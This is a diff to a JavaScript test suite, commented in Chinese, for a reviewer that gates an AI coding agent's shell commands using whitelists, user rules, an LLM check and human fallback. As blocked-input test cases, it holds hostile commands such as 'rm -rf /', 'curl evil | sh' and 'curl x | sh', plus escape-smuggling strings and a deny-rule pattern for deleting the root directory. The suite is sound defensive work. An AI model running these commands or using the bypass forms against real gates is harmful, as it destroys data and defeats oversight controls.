@@ -6,9 +6,13 @@
  *       环境变量必须在 import 业务模块之前设置（common.js 在加载期固化路径）；
  *       覆盖 0.5.0 语义：规则 deny 只做送审提示（route）、快速通道结构化拦截、
  *       缓存绑定策略盐（无旧键兼容）、缓存只承载 allow/deny、脚本附件边界、
- *       送审载荷脱敏、空审查文本 fail-closed
+ *       送审载荷脱敏、空审查文本 fail-closed；
+ *       覆盖 0.6.0 语义：ask_policy 双策略（model 降级送审 / user 转用户）、
+ *       provider_retries 钳制、组合命令快速通道（cd 段 + stderr 尾缀剥离）、
+ *       用户 allow 规则轻量门禁（引号内编程文本放行、跨 shell 逃逸兜底）、
+ *       PreToolUse→PermissionRequest 的 pending-ask 标记
  * 依赖: node:test node:assert node:fs node:os node:path ../src/*
- * 更新日期: 2026年09月17日
+ * 更新日期: 2026年09月18日
  */
 
 import test, { after } from "node:test";
@@ -29,6 +33,10 @@ const {
   matchDangerRules,
   matchCompoundRules,
   matchFastAllow,
+  matchFastSegment,
+  stripStderrRedirect,
+  userAllowSegmentSafe,
+  unquotedRedirectOrMalformed,
   splitTopLevelCommands,
   stableStringify,
   computeCacheKey,
@@ -45,6 +53,9 @@ const {
   buildReviewPayload,
   buildPolicySalt,
   redactSecrets,
+  pendingAskKeyForInput,
+  writePendingAskMarker,
+  takePendingAskMarker,
 } = await import("../src/reviewer.js");
 const { resolveProvider, ProviderError } = await import("../src/provider.js");
 
@@ -72,6 +83,40 @@ test("settings: 类型不符回落默认、数值钳制", () => {
   assert.deepEqual(t_settings.review_tools, ["Bash"], "数组字段给了字符串应回落默认");
   assert.equal(t_settings.timeout_ms, 5000, "低于下限应钳到 5000");
   assert.equal(t_settings.cache_ttl_seconds, 0, "负值应钳到 0");
+});
+
+test("settings: 0.6.0 新键 ask_policy / provider_retries 的默认、回落与钳制", () => {
+  fs.rmSync(path.join(t_tmp_dir, "settings.json"), { force: true });
+  const t_defaults = loadSettings();
+  assert.equal(t_defaults.ask_policy, "model", "ask 策略默认 model（ask 门槛降级送审，只有模型不可用才转人工）");
+  assert.equal(t_defaults.provider_retries, 2, "瞬时故障重试默认 2 次");
+
+  // 非法 ask_policy 回落 model；数值越界就近钳制
+  fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({
+    ask_policy: "banana",
+    provider_retries: 99,
+  }));
+  const t_clamped = loadSettings();
+  assert.equal(t_clamped.ask_policy, "model", "非法 ask_policy 回落 model");
+  assert.equal(t_clamped.provider_retries, 3, "重试钳到上限 3（4×timeout 仍低于 hook 120s 预算）");
+
+  fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({
+    ask_policy: "user",
+    provider_retries: -5,
+  }));
+  const t_low = loadSettings();
+  assert.equal(t_low.ask_policy, "user");
+  assert.equal(t_low.provider_retries, 0, "重试钳到下限 0");
+
+  // 类型不符回落默认而非脏值参与运算
+  fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({
+    ask_policy: 42,
+    provider_retries: "twice",
+  }));
+  const t_bad_types = loadSettings();
+  assert.equal(t_bad_types.ask_policy, "model", "数值类型应被拒并回落默认");
+  assert.equal(t_bad_types.provider_retries, 2, "字符串类型应被拒并回落默认");
+  fs.rmSync(path.join(t_tmp_dir, "settings.json"), { force: true });
 });
 
 test("settings: 非法/超长/空白规则跳过，规则数量上限截断", () => {
@@ -220,6 +265,72 @@ test("reviewer: 快速通道——只读单命令放行（含收紧后的 date/m
   assert.equal(matchFastAllow("git status", { fast_allow_enabled: false }), null, "开关关闭");
 });
 
+test("reviewer: 快速通道组合命令——cd 段与白名单段组合零 LLM 放行（0.6.0 放宽）", () => {
+  fs.rmSync(path.join(t_tmp_dir, "fast_allow.json"), { force: true });
+  const t_settings = { fast_allow_enabled: true };
+  // cd/chdir 段单独放行 + 其余段走严格双门禁：整条组合命令 0 LLM 放行
+  const t_hit = matchFastAllow("cd /d D:\\work\\VPN && dir /b", t_settings);
+  assert.equal(t_hit.action, "allow");
+  assert.ok(t_hit.reason.includes("组合命令快速通道放行"), t_hit.reason);
+  assert.ok(t_hit.reason.includes("目录切换（cd）"), "cd 段应带描述");
+  assert.equal(matchFastAllow("cd build && dir 2>&1", t_settings).action, "allow", "白名单段 + stderr 尾缀组合同样放行");
+  assert.equal(matchFastAllow("chdir sub & git status", t_settings).action, "allow", "chdir 与单 & 后台边界");
+  assert.equal(matchFastAllow("cd .. && ls -la", t_settings).action, "allow");
+  assert.equal(matchFastAllow("cd", t_settings).action, "allow", "裸 cd 只是查看当前目录");
+  // 段尾 2>&1 剥离后单段命中白名单
+  assert.equal(matchFastAllow("dir 2>&1", t_settings).action, "allow");
+  assert.equal(matchFastAllow("git status 2>&1", t_settings).action, "allow");
+  // 任一段不可确定 → 整条交模型
+  assert.equal(matchFastAllow("cd /d D:\\work\\VPN && npm install", t_settings), null, "非白名单段拖整条交模型");
+  assert.equal(matchFastAllow("cd /d D:\\work\\VPN && node x.js", t_settings), null, "解释器执行任意代码不 0 审查放行");
+  assert.equal(matchFastAllow("cd /d D:\\work\\VPN && echo hi > f.txt", t_settings), null, "重定向段不放行");
+  assert.equal(matchFastAllow("cd /d D:\\work\\VPN && cmd /c dir", t_settings), null, "包装器段不放行");
+  assert.equal(matchFastAllow("cd /d D:\\work\\VPN && del build.log", t_settings), null, "删除类命令不 0 审查放行");
+  assert.equal(matchFastAllow("cd a b && dir", t_settings), null, "cd 带多个参数不是纯目录切换");
+  assert.equal(matchFastAllow('cd "a&b" && dir', t_settings), null, "cd 路径含命令边界字符不放行");
+  assert.equal(matchFastAllow("dir 2> err.txt", t_settings), null, "写文件的 stderr 重定向不剥离");
+  assert.equal(matchFastAllow("dir 2>&1 | findstr x", t_settings), null, "管道拆段后仍逐段判定");
+});
+
+test("reviewer: 用户旗舰形态——cd 段 + node -e 只读脚本由用户 allow 规则整条放行", async () => {
+  fs.rmSync(path.join(t_tmp_dir, "fast_allow.json"), { force: true });
+  // 用户为两个分段各写一条 allow 规则（cd 规则 + 只读内联脚本规则）+ 保留删根 deny 规则
+  fs.writeFileSync(path.join(t_tmp_dir, "danger_rules.json"), JSON.stringify([
+    { pattern: "^cd /d D:\\\\work\\\\VPN$", action: "allow", description: "切换到 VPN 项目" },
+    { pattern: "^node -e \"const fs=require\\('fs'\\);const s=fs\\.readFileSync\\([\\s\\S]*\" 2>&1$", action: "allow", description: "只读内联脚本" },
+    { pattern: "rm\\s+-([a-z]*r[a-z]*f|[a-z]*f[a-z]*r)[a-z]*\\s+/", action: "deny", description: "递归强删根目录" },
+  ]));
+  const t_node_seg = 'node -e "const fs=require(\'fs\');const s=fs.readFileSync(\'page/_worker.js\',\'utf8\');'
+    + 'const L=s.split(/\\r?\\n/);console.log(L.slice(0,60).map((l,i)=>(i+1)+\'| \'+l.slice(0,200)).join(\'\\n\'));" 2>&1';
+  const t_full = `cd /d D:\\work\\VPN && ${t_node_seg}`;
+
+  // 快速通道（零配置）不放行任意 JS：该形态必须经用户规则或模型
+  assert.equal(matchFastAllow(t_full, { fast_allow_enabled: true }), null, "零配置不自动放行内联代码");
+  // 全文 allow 规则不整条放行——组合命令必须逐段确认
+  assert.equal(matchDangerRules(t_full, { ask_policy: "model" }), null);
+  // 每段都有 allow 规则覆盖 + 每段过轻量门禁 → 整条白名单放行
+  const t_allow = matchCompoundRules(t_full, { ask_policy: "model" });
+  assert.equal(t_allow.action, "allow", "用户旗舰形态应能被自写 allow 规则整条放行");
+  assert.ok(t_allow.reason.includes("段子命令全部命中白名单规则"), t_allow.reason);
+  // 0.5.1 的旧断言形态同样保持：deny 段压过 allow 段
+  const t_evil = matchCompoundRules(`${t_full}; rm -rf /`, { ask_policy: "model" });
+  assert.equal(t_evil.action, "route", "嵌入 rm -rf / 的段必须转送审提示");
+  assert.ok(t_evil.ruleHint.includes("递归强删根目录"), t_evil.ruleHint);
+  // 端到端：规则层放行（source=rule），不经 LLM
+  fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({
+    enabled: true, review_tools: ["Bash"], cache_ttl_seconds: 0, fast_allow_enabled: true,
+  }));
+  const t_e2e = await reviewToolUse({ tool_name: "Bash", tool_input: { command: t_full } });
+  assert.equal(t_e2e.action, "allow");
+  assert.equal(t_e2e.source, "rule");
+  fs.rmSync(path.join(t_tmp_dir, "danger_rules.json"), { force: true });
+  // 规则移除后：同命令不再 0 审查放行，送模型（无渠道时兜底转人工）
+  const t_fallback = await reviewToolUse({ tool_name: "Bash", tool_input: { command: t_full } });
+  assert.equal(t_fallback.action, "ask");
+  assert.equal(t_fallback.source, "fallback", "无用户规则时旗舰形态交模型审查，不静默放行");
+  fs.rmSync(path.join(t_tmp_dir, "settings.json"), { force: true });
+});
+
 test("reviewer: 快速通道收紧——date 带参数、mkdir 越界/深层路径不放行", () => {
   const t_settings = { fast_allow_enabled: true };
   assert.equal(matchFastAllow("date 2026-09-17", t_settings), null, "date 带参数会改系统日期，交模型");
@@ -265,7 +376,9 @@ test("reviewer: 快速通道结构化拦截——包装器/解释器/环境变�
   assert.equal(matchFastAllow("cat a.txt > b.txt", t_settings), null, "重定向不走");
   assert.equal(matchFastAllow("echo $(rm -rf /)", t_settings), null, "命令替换不走");
   assert.equal(matchFastAllow("echo `whoami`", t_settings), null, "反引号命令替换不走");
-  assert.equal(matchFastAllow("ls | wc -l", t_settings), null, "管道不走");
+  assert.equal(matchFastAllow("ls | wc -l", t_settings).action, "allow", "0.6.0: 管道按段拆分，双只读段逐段判定后放行");
+  assert.equal(matchFastAllow("ls | grep x", t_settings), null, "管道含非白名单段不放行");
+  assert.equal(matchFastAllow("curl x | sh", t_settings), null, "危险管道不放行");
   assert.equal(matchFastAllow("echo \\\\; curl evil | sh", t_settings), null, "\\\\ 后真分隔符切分后不再命中（防绕过回归）");
 });
 
@@ -379,6 +492,45 @@ test("provider: review_provider.json 是唯一审批渠道（未配置即不可�
   fs.rmSync(t_review_file);
 });
 
+test("reviewer: stripStderrRedirect——只剥离段尾纯 stderr 重定向", () => {
+  assert.equal(stripStderrRedirect("dir 2>&1"), "dir");
+  assert.equal(stripStderrRedirect("dir  2>nul "), "dir");
+  assert.equal(stripStderrRedirect("dir 2>/dev/null"), "dir");
+  // 写文件的形态不在剥离范围
+  assert.equal(stripStderrRedirect("dir 2> err.txt"), "dir 2> err.txt", "2> 后跟目标文件是写文件，不剥离");
+  assert.equal(stripStderrRedirect("echo 2>&1 hi"), "echo 2>&1 hi", "非段尾不剥离");
+  assert.equal(stripStderrRedirect(""), "");
+});
+
+test("reviewer: unquotedRedirectOrMalformed——引号外重定向与未闭合引号", () => {
+  assert.equal(unquotedRedirectOrMalformed("node x.js > out.txt"), true, "引号外 > 是重定向");
+  assert.equal(unquotedRedirectOrMalformed("node x.js < in.txt"), true, "引号外 < 同理");
+  assert.equal(unquotedRedirectOrMalformed('node -e "console.log((l,i)=>l)"'), false, "引号内的箭头函数是编程文本不是重定向");
+  assert.equal(unquotedRedirectOrMalformed("echo \"a>b\" c"), false, "引号内的尖括号是字面量");
+  assert.equal(unquotedRedirectOrMalformed('echo "unclosed'), true, "未闭合引号视为畸形");
+  assert.equal(unquotedRedirectOrMalformed("plain text"), false);
+  assert.equal(unquotedRedirectOrMalformed(""), false);
+});
+
+test("reviewer: userAllowSegmentSafe——用户 allow 规则的轻量结构门禁", () => {
+  // 用户旗舰示例形态：引号内的编程文本（括号/箭头函数/单引号）与 2>&1 尾缀都可通过
+  const t_node_seg = 'node -e "const fs=require(\'fs\');const s=fs.readFileSync(\'page/_worker.js\',\'utf8\');'
+    + 'const L=s.split(/\\r?\\n/);console.log(L.slice(0,60).map((l,i)=>(i+1)+\'| \'+l.slice(0,200)).join(\'\\n\'));" 2>&1';
+  assert.equal(userAllowSegmentSafe(t_node_seg), true, "内联只读脚本 + 2>&1 应能进入用户白名单");
+  assert.equal(userAllowSegmentSafe("cd /d D:\\work\\VPN"), true, "Windows 反斜杠路径放行");
+  assert.equal(userAllowSegmentSafe("echo hi"), true);
+  assert.equal(userAllowSegmentSafe("dir 2>&1"), true, "段尾 stderr 重定向剥离后判定");
+  // 确定性逃逸形态仍然兜底
+  assert.equal(userAllowSegmentSafe("echo $(rm -rf /)"), false, "命令替换不放行");
+  assert.equal(userAllowSegmentSafe("echo `whoami`"), false, "反引号命令替换不放行");
+  assert.equal(userAllowSegmentSafe("node x.js > out.txt"), false, "引号外重定向不放行");
+  assert.equal(userAllowSegmentSafe("echo a\\& payload"), false, "\\& 在 bash 是字面量、在 cmd 是真命令边界，不放行");
+  assert.equal(userAllowSegmentSafe("echo a\\; curl evil"), false, "\\; 同理不放行");
+  assert.equal(userAllowSegmentSafe('echo "unclosed > x'), false, "未闭合引号不放行");
+  assert.equal(userAllowSegmentSafe("%COMSPEC% /c x"), false, "%VAR% 展开间接执行不放行");
+  assert.equal(userAllowSegmentSafe("  "), false, "空白段不放行");
+});
+
 test("reviewer: 复合命令分割器——引号/命令替换内的分隔符不切分", () => {
   assert.deepEqual(splitTopLevelCommands("ls -la"), ["ls -la"], "单命令不切分");
   assert.deepEqual(splitTopLevelCommands("ls; echo hi"), ["ls", "echo hi"]);
@@ -400,6 +552,12 @@ test("reviewer: 复合命令分割器——引号/命令替换内的分隔符不
   assert.deepEqual(splitTopLevelCommands('cd C:\\\\; node x.js'), ["cd C:\\\\", "node x.js"], "Windows 双反斜杠路径同样切分");
   assert.deepEqual(splitTopLevelCommands("echo a\\;b"), ["echo a\\;b"], "单反斜杠转义的分隔符不切分");
   assert.deepEqual(splitTopLevelCommands("'a\\'; rm -rf /"), ["'a\\'", "rm -rf /"], "单引号内反斜杠是字面量，不转义引号闭合");
+  // 0.6.0：fd 复制后缀（2>&1）里的 & 不是命令边界——前字符是 > 说明在重定向目标内，
+  // 切走会让 "node x.js 2>&1" 被拆成残段，快速通道与规则逐段全部误判
+  assert.deepEqual(splitTopLevelCommands("node --version 2>&1"), ["node --version 2>&1"], "2>&1 不切分");
+  assert.deepEqual(splitTopLevelCommands("dir 2>&1 && echo hi"), ["dir 2>&1", "echo hi"], "2>&1 后的 && 仍是边界");
+  assert.deepEqual(splitTopLevelCommands("cmd 2>nul & dir 2>&1"), ["cmd 2>nul", "dir 2>&1"], "2>nul 同理不切分自身");
+  assert.deepEqual(splitTopLevelCommands("echo \"a 2>&1 b\" && ls"), ['echo "a 2>&1 b"', "ls"], "引号内的 2>&1 只是字面文本");
 });
 
 test("reviewer: 复合命令逐段——ask 段整条转用户、deny 段提炼提示、全 allow 放行、混合降级 LLM", () => {
@@ -439,6 +597,91 @@ test("reviewer: 复合命令逐段——ask 段整条转用户、deny 段提炼�
 
   // 单命令（无分隔符）不进入复合逻辑
   assert.equal(matchCompoundRules("ls"), null);
+});
+
+test("reviewer: ask_policy 双语义——model 把 ask 门槛降级为送审提示、user 保持转用户", async () => {
+  fs.writeFileSync(path.join(t_tmp_dir, "danger_rules.json"), JSON.stringify([
+    { pattern: "^ls\\b", action: "allow", description: "ls 白名单" },
+    { pattern: "shutdown", action: "ask", description: "关机确认" },
+  ]));
+  fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({
+    enabled: true, review_tools: ["Bash"], cache_ttl_seconds: 0, fast_allow_enabled: false,
+  }));
+  fs.rmSync(path.join(t_tmp_dir, "review_provider.json"), { force: true });
+
+  // 规则层直调按传入策略分流
+  const t_route = matchDangerRules("shutdown /s /t 0", { ask_policy: "model" });
+  assert.equal(t_route.action, "route", "model 策略：ask 规则降级为送审提示");
+  assert.ok(t_route.ruleHint.includes("原为用户确认门槛"), t_route.ruleHint);
+  assert.equal(matchDangerRules("shutdown /s /t 0", { ask_policy: "user" }).action, "ask", "user 策略：ask 规则恒转用户");
+  assert.equal(matchDangerRules("shutdown /s /t 0").action, "ask", "未传 settings 保持旧语义（ask）");
+  // 复合命令段级同样分流
+  const t_comp_route = matchCompoundRules("ls && shutdown now", { ask_policy: "model" });
+  assert.equal(t_comp_route.action, "route");
+  assert.ok(t_comp_route.ruleHint.includes("原为用户确认门槛"), t_comp_route.ruleHint);
+  assert.equal(matchCompoundRules("ls && shutdown now", { ask_policy: "user" }).action, "ask");
+  assert.ok(matchCompoundRules("ls && shutdown now", { ask_policy: "user" }).reason.includes("shutdown now"), "user 策略提示指出命中段");
+  assert.equal(matchCompoundRules("ls && shutdown now").action, "ask", "未传 settings 组合命令同样保持 ask");
+
+  // 端到端（默认 model）：ask 规则命令送模型终审；管道无渠道时兜底转人工而非直接弹给用户
+  const t_e2e_model = await reviewToolUse({ tool_name: "Bash", tool_input: { command: "shutdown /s /t 0" } });
+  assert.equal(t_e2e_model.action, "ask");
+  assert.equal(t_e2e_model.source, "fallback", "model 策略下 ask 门槛先送审，模型不可用才转人工");
+  // 端到端（user）：ask 规则命令直接转用户（source=rule）
+  fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({
+    enabled: true, review_tools: ["Bash"], cache_ttl_seconds: 0, fast_allow_enabled: false, ask_policy: "user",
+  }));
+  const t_e2e_user = await reviewToolUse({ tool_name: "Bash", tool_input: { command: "shutdown /s /t 0" } });
+  assert.equal(t_e2e_user.action, "ask");
+  assert.equal(t_e2e_user.source, "rule", "user 策略下 ask 门槛直接转用户，不先送模型");
+  fs.rmSync(path.join(t_tmp_dir, "danger_rules.json"), { force: true });
+  fs.rmSync(path.join(t_tmp_dir, "settings.json"), { force: true });
+});
+
+test("reviewer: 策略盐纳入 ask_policy——策略切换后旧缓存结论不跨策略复用", () => {
+  fs.rmSync(path.join(t_tmp_dir, "danger_rules.json"), { force: true });
+  fs.rmSync(path.join(t_tmp_dir, "security_prompt.md"), { force: true });
+  fs.rmSync(path.join(t_tmp_dir, "review_provider.json"), { force: true });
+  fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({ ask_policy: "model" }));
+  const t_salt_model = buildPolicySalt();
+  assert.equal(buildPolicySalt(), t_salt_model, "同策略下盐稳定");
+  fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({ ask_policy: "user" }));
+  assert.notEqual(buildPolicySalt(), t_salt_model, "ask 策略变化后旧缓存必须失效");
+  fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({ ask_policy: "banana" }));
+  assert.equal(buildPolicySalt(), t_salt_model, "非法策略回落 model，盐与 model 一致");
+  fs.rmSync(path.join(t_tmp_dir, "settings.json"), { force: true });
+});
+
+test("reviewer: pending-ask 标记——写/一次性消费/TTL 过期/损坏容错", () => {
+  fs.rmSync(path.join(t_tmp_dir, "pending_asks.json"), { force: true });
+  const t_key_a = pendingAskKeyForInput({ tool_name: "Bash", tool_input: { command: "npm install left-pad" } });
+  const t_key_b = pendingAskKeyForInput({ tool_name: "Bash", tool_input: { command: "rm -rf /tmp/x" } });
+  // 键稳定性：同一命令重复计算同键；不同命令不同键；工具别名归一后同键
+  assert.equal(t_key_a, pendingAskKeyForInput({ tool_name: "Bash", tool_input: { command: "npm install left-pad" } }));
+  assert.notEqual(t_key_a, t_key_b);
+  assert.equal(
+    pendingAskKeyForInput({ tool_name: "ApplyPatch", tool_input: { file_path: "a.js" } }),
+    pendingAskKeyForInput({ tool_name: "Write", tool_input: { file_path: "a.js" } }),
+    "ApplyPatch 归一到 Write 后同一目标同键",
+  );
+  // 写/消费：命中返回 true 且一次性
+  assert.equal(takePendingAskMarker(t_key_a), false, "无标记返回 false");
+  writePendingAskMarker(t_key_a);
+  assert.equal(takePendingAskMarker(t_key_a), true, "新鲜标记命中退避");
+  assert.equal(takePendingAskMarker(t_key_a), false, "标记被消费后不复用");
+  // TTL 过期：手工回写陈旧时间戳后不再退避
+  writePendingAskMarker(t_key_b);
+  const t_marker_file = path.join(t_tmp_dir, "pending_asks.json");
+  const t_raw_markers = JSON.parse(fs.readFileSync(t_marker_file, "utf8"));
+  t_raw_markers[t_key_b] = Date.now() - 60 * 1000;
+  fs.writeFileSync(t_marker_file, JSON.stringify(t_raw_markers));
+  assert.equal(takePendingAskMarker(t_key_b), false, "陈旧标记视为过期，第二层照常审查");
+  // 损坏文件不炸：读按无标记处理，写路径可重建
+  fs.writeFileSync(t_marker_file, "not-json{");
+  assert.equal(takePendingAskMarker(t_key_a), false, "损坏文件下退避失败但不抛错");
+  writePendingAskMarker(t_key_a);
+  assert.equal(takePendingAskMarker(t_key_a), true, "损坏后重建标记成功");
+  fs.rmSync(t_marker_file, { force: true });
 });
 
 test("settings: 脚本送审新键默认值、覆盖与钳制", () => {
@@ -715,7 +958,7 @@ test("reviewer: 空审查文本 fail-closed——空命令/缺路径统一阻断
 
 test("reviewer: 模式闸门——仅 edit 接管，其他模式 pass，缺失时保持接管", async () => {
   fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({
-    enabled: true, review_tools: ["Bash"], cache_ttl_seconds: 0, fast_allow_enabled: false,
+    enabled: true, review_tools: ["Bash"], cache_ttl_seconds: 0, fast_allow_enabled: false, ask_policy: "user",
   }));
   fs.rmSync(path.join(t_tmp_dir, "review_provider.json"), { force: true });
   const t_base = { tool_name: "Bash", tool_input: { command: 'node -e "process.exit(0)"', description: "探测" } };
